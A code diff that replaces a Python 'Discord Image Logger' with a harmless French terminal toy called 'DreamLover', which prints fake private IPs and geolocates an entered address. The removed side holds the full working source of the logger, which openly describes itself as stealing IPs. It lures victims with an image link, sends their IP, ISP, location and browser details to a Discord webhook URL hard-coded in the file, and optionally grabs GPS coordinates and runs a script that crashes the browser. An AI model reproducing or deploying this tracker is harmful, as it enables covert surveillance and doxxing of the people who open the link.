@@ -1,304 +1,336 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+DreamLover — Mod Menu IP Checker (IPv4 + IP info)
+- Génère uniquement des adresses IPv4 dans des plages réservées / privées / link-local / loopback.
+- Préfixe "[+]" devant chaque IP.
+- Nouvelle option: IP info -> entre une IP IPv4 et le script tente de géolocaliser (pays, ville, lat/lon)
+  puis ouvre une carte (Leaflet) avec un point rouge.
+- Dossier de sortie carte HTML : ~/dreamlover_maps
+"""
 
-from http.server import BaseHTTPRequestHandler
-from urllib import parse
-import traceback, requests, base64, httpagentparser
+import time
+import random
+import sys
+import json
+import webbrowser
+import urllib.parse
+import os
+from datetime import datetime
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+try:
+    import requests
+except Exception:
+    requests = None
 
-config = {
-    # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+# --- CONFIG ---
+INTERVAL = 2  # secondes entre chaque affichage (modifiable)
+MAP_OUTPUT_DIR = os.path.expanduser("~/dreamlover_maps")
+os.makedirs(MAP_OUTPUT_DIR, exist_ok=True)
 
-    # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+# --- Couleurs (colorama si installé, sinon séquences ANSI basiques) ---
+try:
+    from colorama import init as colorama_init, Fore, Style
+    colorama_init()
+except Exception:
+    class Fore:
+        RED = "\033[31m"
+        GREEN = "\033[32m"
+        YELLOW = "\033[33m"
+        BLUE = "\033[34m"
+        MAGENTA = "\033[35m"
+        CYAN = "\033[36m"
+        RESET = "\033[39m"
+    class Style:
+        BRIGHT = "\033[1m"
+        NORMAL = "\033[0m"
+        RESET_ALL = "\033[0m"
 
-    # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
-    
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+# --- Helpers ---
+def now_str():
+    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
-    },
+def banner():
+    print(Style.BRIGHT + Fore.CYAN + r"""
+  ____                                     _                     _             
+ |  _ \  ___  _ __ ___   ___  _ __   ___  | |    ___   __ _  ___| | _____ _ __ 
+ | | | |/ _ \| '_ ` _ \ / _ \| '_ \ / _ \ | |   / _ \ / _` |/ __| |/ / _ \ '__|
+ | |_| | (_) | | | | | | (_) | | | |  __/ | |__| (_) | (_| | (__|   <  __/ |   
+ |____/ \___/|_| |_| |_|\___/|_| |_|\___| |_____\___/ \__,_|\___|_|\_\___|_|   
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
-                # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
+""" + Style.RESET_ALL)
+    print(Fore.YELLOW + "  DreamLover — Mod Menu IP Checker (IPv4 + IP info)" + Fore.RESET)
+    print(Fore.MAGENTA + "  (Ctrl+C pour revenir au menu depuis un affichage en boucle)\n" + Fore.RESET)
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+# --- Générateurs IPv4 ---
+def gen_loopback_ipv4():
+    a = 127
+    b = random.randint(0, 255)
+    c = random.randint(1, 254)
+    d = random.randint(1, 254)
+    return f"{a}.{b}.{c}.{d}"
 
-    "antiBot": 1, # Prevents bots from triggering the alert
-                # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
-    
+def gen_private_10():
+    return f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
 
-    # REDIRECTION #
-    "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
-    },
+def gen_private_192_168():
+    return f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
 
-    # Please enter all values in correct format. Otherwise, it may break.
-    # Do not edit anything below this, unless you know what you're doing.
-    # NOTE: Hierarchy tree goes as follows:
-    # 1) Redirect (If this is enabled, disables image and crash browser)
-    # 2) Crash Browser (If this is enabled, disables image)
-    # 3) Message (If this is enabled, disables image)
-    # 4) Image 
-}
+def gen_private_172():
+    second = random.randint(16,31)
+    return f"172.{second}.{random.randint(0,255)}.{random.randint(1,254)}"
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
+def gen_link_local_ipv4():
+    return f"169.254.{random.randint(0,255)}.{random.randint(1,254)}"
 
-def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")):
-        return "Discord"
-    elif useragent.startswith("TelegramBot"):
-        return "Telegram"
+SIMULATED_GENERATORS = [
+    ("Loopback IPv4 (127/8)", gen_loopback_ipv4),
+    ("Private 10/8", gen_private_10),
+    ("Private 192.168/16", gen_private_192_168),
+    ("Private 172.16-31/16", gen_private_172),
+    ("Link-local IPv4 (169.254/16)", gen_link_local_ipv4),
+]
+
+def simulated_ip(choice=None):
+    if choice is None:
+        name, fn = random.choice(SIMULATED_GENERATORS)
+        return fn(), name
     else:
+        try:
+            idx = int(choice)
+            idx = max(0, min(idx, len(SIMULATED_GENERATORS)-1))
+            name, fn = SIMULATED_GENERATORS[idx]
+            return fn(), name
+        except Exception:
+            name, fn = random.choice(SIMULATED_GENERATORS)
+            return fn(), name
+
+# --- Fake Tor info ---
+def fake_tor_status():
+    exit_node, _ = simulated_ip()
+    hops = []
+    for _ in range(3):
+        hop_ip, _ = simulated_ip()
+        hops.append(hop_ip)
+    circuit = []
+    prev = None
+    for h in hops:
+        if h != prev:
+            circuit.append(h)
+        prev = h
+    return {
+        "status": "CONNECTED",
+        "exit_node": exit_node,
+        "circuit": circuit
+    }
+
+# --- IPv4 reserved detection ---
+def is_reserved_ipv4(ip_str):
+    try:
+        parts = [int(p) for p in ip_str.split(".")]
+        if len(parts) != 4:
+            return False
+        a,b,c,d = parts
+        if a == 127 or a == 10:
+            return True
+        if a == 192 and b == 168:
+            return True
+        if a == 172 and 16 <= b <= 31:
+            return True
+        if a == 169 and b == 254:
+            return True
+        return False
+    except Exception:
         return False
 
-def reportError(error):
-    requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "@everyone",
-    "embeds": [
-        {
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-        }
-    ],
-})
+# --- Geolocation (ip-api.com) ---
+def geolocate_ip(ip):
+    if requests is None:
+        return False, "Module 'requests' non disponible."
+    url = f"http://ip-api.com/json/{urllib.parse.quote(ip)}"
+    try:
+        r = requests.get(url, timeout=6)
+    except Exception as e:
+        return False, f"Erreur réseau : {e}"
+    try:
+        data = r.json()
+    except Exception:
+        return False, "Réponse non-JSON reçue."
+    if data.get("status") == "success":
+        return True, data
+    else:
+        return False, f"Service a répondu : {data.get('message','échoué')}"
 
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
-    if ip.startswith(blacklistedIPs):
+# --- Création carte HTML ---
+def create_map_html(lat, lon, popup_html, out_filename):
+    safe_name = out_filename.replace("/", "_").replace("\\", "_")
+    path = f"{MAP_OUTPUT_DIR.rstrip('/')}/{safe_name}"
+    html = f"""<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <title>DreamLover — IP Map</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+  <style>html,body,#map{{height:100%;margin:0;padding:0}}</style>
+</head>
+<body>
+<div id="map"></div>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+  var lat = {lat};
+  var lon = {lon};
+  var map = L.map('map').setView([lat, lon], 4);
+  L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{
+    maxZoom: 19,
+    attribution: '© OpenStreetMap contributors'
+  }}).addTo(map);
+  var redIcon = L.circleMarker([lat, lon], {{radius:8, color: 'red', fillColor: 'red', fillOpacity: 0.9}});
+  redIcon.addTo(map).bindPopup({json.dumps(popup_html)});
+</script>
+</body>
+</html>
+"""
+    try:
+        with open(path, "w", encoding="utf-8") as f:
+            f.write(html)
+        return True, path
+    except Exception as e:
+        return False, f"Erreur écriture fichier HTML: {e}"
+
+# --- IP info interactive ---
+def ip_info_interactive():
+    print()
+    ip = input("Entre l'adresse IPv4 à géolocaliser > ").strip()
+    if not ip:
+        print(Fore.RED + "Aucune IP fournie." + Fore.RESET)
         return
-    
-    bot = botCheck(ip, useragent)
-    
-    if bot:
-        requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "",
-    "embeds": [
-        {
-            "title": "Image Logger - Link Sent",
-            "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-        }
-    ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+    parts = ip.split(".")
+    if len(parts) != 4 or any(not p.isdigit() or not (0 <= int(p) <= 255) for p in parts):
+        print(Fore.RED + "Format IPv4 invalide." + Fore.RESET)
         return
-
-    ping = "@everyone"
-
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    if info["proxy"]:
-        if config["vpnCheck"] == 2:
-                return
-        
-        if config["vpnCheck"] == 1:
-            ping = ""
-    
-    if info["hosting"]:
-        if config["antiBot"] == 4:
-            if info["proxy"]:
-                pass
-            else:
-                return
-
-        if config["antiBot"] == 3:
-                return
-
-        if config["antiBot"] == 2:
-            if info["proxy"]:
-                pass
-            else:
-                ping = ""
-
-        if config["antiBot"] == 1:
-                ping = ""
-
-
-    os, browser = httpagentparser.simple_detect(useragent)
-    
-    embed = {
-    "username": config["username"],
-    "content": ping,
-    "embeds": [
-        {
-            "title": "Image Logger - IP Logged",
-            "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
-
-**Endpoint:** `{endpoint}`
-            
-**IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
-
-**PC Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
-
-**User Agent:**
-```
-{useragent}
-```""",
-    }
-  ],
-}
-    
-    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json = embed)
-    return info
-
-binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
-    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
-    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
-}
-
-class ImageLoggerAPI(BaseHTTPRequestHandler):
-    
-    def handleRequest(self):
-        try:
-            if config["imageArgument"]:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-                if dic.get("url") or dic.get("id"):
-                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
-                else:
-                    url = config["image"]
-            else:
-                url = config["image"]
-
-            data = f'''<style>body {{
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
-            
-            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
-                return
-            
-            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
-
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-                
-                return
-            
-            else:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-
-                if dic.get("g") and config["accurateLocation"]:
-                    location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
-                else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-                
-
-                message = config["message"]["message"]
-
-                if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
-                    message = message.replace("{isp}", result["isp"])
-                    message = message.replace("{asn}", result["as"])
-                    message = message.replace("{country}", result["country"])
-                    message = message.replace("{region}", result["regionName"])
-                    message = message.replace("{city}", result["city"])
-                    message = message.replace("{lat}", str(result["lat"]))
-                    message = message.replace("{long}", str(result["lon"]))
-                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                    message = message.replace("{mobile}", str(result["mobile"]))
-                    message = message.replace("{vpn}", str(result["proxy"]))
-                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-
-                datatype = 'text/html'
-
-                if config["message"]["doMessage"]:
-                    data = message.encode()
-                
-                if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
-
-                if config["redirect"]["redirect"]:
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200) # 200 = OK (HTTP Status)
-                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                if config["accurateLocation"]:
-                    data += b"""<script>
-var currenturl = window.location.href;
-
-if (!currenturl.includes("g=")) {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (coords) {
-    if (currenturl.includes("?")) {
-        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    } else {
-        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    }
-    location.replace(currenturl);});
-}}
-
-</script>"""
-                self.wfile.write(data)
-        
-        except Exception:
-            self.send_response(500)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
-            reportError(traceback.format_exc())
-
+    if is_reserved_ipv4(ip):
+        print(Fore.YELLOW + f"L'adresse {ip} est réservée/private. Géoloc non applicable." + Fore.RESET)
         return
-    
-    do_GET = handleRequest
-    do_POST = handleRequest
+    if requests is None:
+        print(Fore.RED + "Module 'requests' non installé." + Fore.RESET)
+        return
+    print(Fore.BLUE + "Géolocalisation via ip-api.com..." + Fore.RESET)
+    ok, result = geolocate_ip(ip)
+    if not ok:
+        print(Fore.RED + f"Géoloc impossible: {result}" + Fore.RESET)
+        return
+    data = result
+    country = data.get("country","N/A")
+    region = data.get("regionName","N/A")
+    city = data.get("city","N/A")
+    lat = data.get("lat")
+    lon = data.get("lon")
+    isp = data.get("isp","N/A")
+    query = data.get("query", ip)
+    print(Style.BRIGHT + Fore.GREEN + f"\nRésultat pour {query} :" + Style.RESET_ALL)
+    print(Fore.CYAN + f" - Pays: {country}" + Fore.RESET)
+    print(Fore.CYAN + f" - Région: {region}" + Fore.RESET)
+    print(Fore.CYAN + f" - Ville: {city}" + Fore.RESET)
+    print(Fore.CYAN + f" - Latitude: {lat}  Longitude: {lon}" + Fore.RESET)
+    print(Fore.CYAN + f" - ISP: {isp}\n" + Fore.RESET)
+    popup = f"<b>{query}</b><br/>{city}, {region}, {country}<br/>lat: {lat}, lon: {lon}"
+    out_file = f"ip_map_{query.replace(':','_')}.html"
+    ok, path_or_err = create_map_html(lat, lon, popup, out_file)
+    if not ok:
+        print(Fore.RED + path_or_err + Fore.RESET)
+        return
+    print(Fore.GREEN + f"Carte créée: {path_or_err}" + Fore.RESET)
+    try:
+        webbrowser.open("file://" + path_or_err)
+        print(Fore.YELLOW + "La carte s'ouvre dans le navigateur." + Fore.RESET)
+    except Exception as e:
+        print(Fore.RED + f"Impossible d'ouvrir le navigateur: {e}" + Fore.RESET)
 
-handler = ImageLoggerAPI
+# --- Boucle affichage IP simulées ---
+def loop_show_ip(mode="direct", demo_random=False):
+    print()
+    mode_label = "DEMO (IPs IPv4 aléatoires)" if demo_random else ("Tor" if mode=="tor" else "Direct")
+    print(Fore.BLUE + f"[{now_str()}] Mode: {mode_label} — affichage toutes les {INTERVAL}s (Ctrl+C pour arrêter)" + Fore.RESET)
+    if mode=="tor" and not demo_random:
+        tor_info = fake_tor_status()
+        print(Fore.YELLOW + f"Tor status: {tor_info['status']}" + Fore.RESET)
+        print(Fore.MAGENTA + "Circuit : " + " -> ".join(f"[+] {h}" for h in tor_info["circuit"]) + Fore.RESET)
+        print(Fore.CYAN + f"Exit node : [+] {tor_info['exit_node']}\n" + Fore.RESET)
+    try:
+        while True:
+            ip, src = simulated_ip()
+            tag = "Ton IP (via Tor)" if mode=="tor" else f"Ton IP ({src})"
+            ts = now_str()
+            print(Style.BRIGHT + Fore.GREEN + f"[{ts}] {tag} : " + Fore.CYAN + f"[+] {ip}" + Style.RESET_ALL)
+            time.sleep(INTERVAL)
+    except KeyboardInterrupt:
+        print("\n" + Fore.MAGENTA + "Retour au menu principal..." + Fore.RESET)
+        time.sleep(0.3)
+
+# --- Menu ---
+def show_menu():
+    banner()
+    print(Style.BRIGHT + "Menu principal:" + Style.RESET_ALL)
+    print(Fore.YELLOW + "[+] 1)" + Fore.RESET + " Lancer le script (Direct)")
+    print(Fore.YELLOW + "[+] 2)" + Fore.RESET + " Lancer le script via Tor (status affiché)")
+    print(Fore.YELLOW + "[+] 3)" + Fore.RESET + " Mode démo — afficher IPs IPv4 aléatoires")
+    print(Fore.YELLOW + "[+] 4)" + Fore.RESET + " Voir les types d'adresses disponibles")
+    print(Fore.YELLOW + "[+] 5)" + Fore.RESET + " IP info (géolocaliser une IP et afficher la carte)")
+    print(Fore.YELLOW + "[+] 6)" + Fore.RESET + " Crédits & infos")
+    print(Fore.YELLOW + "[+] 7)" + Fore.RESET + " Quitter\n")
+
+def show_address_types():
+    print("\nTypes d'adresses disponibles :")
+    for i, (name, _) in enumerate(SIMULATED_GENERATORS):
+        print(f" {i}) {name}")
+    print()
+    input("Appuie sur Entrée pour revenir au menu...")
+
+def credits():
+    print()
+    print(Style.BRIGHT + Fore.CYAN + "Crédits — DreamLover" + Style.RESET_ALL)
+    print(" - Création : DreamLover")
+    print(" - Plages utilisées : loopback (127/8), private (10/8, 192.168/16, 172.16-31), link-local (169.254).")
+    print(Fore.YELLOW + "\nDISCLAIMER: Outil à usage esthétique. Seule la fonction 'IP info' réalise une requête réseau pour géolocaliser.\n" + Fore.RESET)
+
+def prompt_choice():
+    try:
+        choice = input(Style.BRIGHT + Fore.MAGENTA + "Choisis une option (1-7) > " + Style.RESET_ALL).strip()
+        return choice
+    except (KeyboardInterrupt, EOFError):
+        print("\n")
+        return "7"
+
+# --- Main loop ---
+def main():
+    while True:
+        show_menu()
+        choice = prompt_choice()
+        if choice == "1":
+            loop_show_ip(mode="direct", demo_random=False)
+        elif choice == "2":
+            loop_show_ip(mode="tor", demo_random=False)
+        elif choice == "3":
+            loop_show_ip(mode="direct", demo_random=True)
+        elif choice == "4":
+            show_address_types()
+        elif choice == "5":
+            ip_info_interactive()
+            input("\nAppuie sur Entrée pour revenir au menu...")
+        elif choice == "6":
+            credits()
+            input("Appuie sur Entrée pour revenir au menu...")
+        elif choice == "7":
+            print(Fore.GREEN + "Merci d'avoir utilisé DreamLover — Mod Menu IP Checker. À bientôt !" + Fore.RESET)
+            break
+        else:
+            print(Fore.RED + "Option invalide — réessaye." + Fore.RESET)
+            time.sleep(0.5)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except Exception as e:
+        print(Fore.RED + "Une erreur inattendue est survenue :" + Fore.RESET, e)
+        sys.exit(1)
